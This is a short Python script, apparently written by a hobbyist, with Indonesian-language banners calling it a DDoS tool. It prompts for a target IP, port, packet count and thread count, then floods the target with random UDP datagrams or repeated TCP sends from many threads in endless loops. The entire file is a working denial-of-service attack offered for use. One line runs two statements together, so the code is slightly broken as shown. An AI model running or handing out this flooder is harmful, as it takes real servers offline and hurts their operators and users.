#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

print("{00FF00}DDOS TOOLS GILBERT.")

print("{00FF00} BISMILLAH DOANG!!!!!")

print("{00FF00}Script ini dibuat hanya untuk GILBERT.")

print("{00FF00}Gassssss!!!!!!!!")

print("{00FF00}SKUD KITA DDOS.")

ip = str(input(" IP YANG MAU LU DDOS:"))

port = int(input(" PORT NYA:"))

choice = str(input(" UDP(y/n):"))

times = int(input(" PAKET NYA MAU BERAPA TOD? : "))

threads = int(input(" THREAD NYA MAU BERAPA TOD? :"))

def run():

	data = random._urandom(1024)	i = random.choice(("[*]","[!]","[#]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +" PAKET LAGI OTW!!!")

		except:

			print("[!] GAGALTOD!!!")

def run2():

	data = random._urandom(16)

	i = random.choice(("[*]","[!]","[#]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +" SAMPEEEE!!!")

		except:

			s.close()

			print("[*] Error")

            

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

	else:

		th = threading.Thread(target = run2)

		th.start()
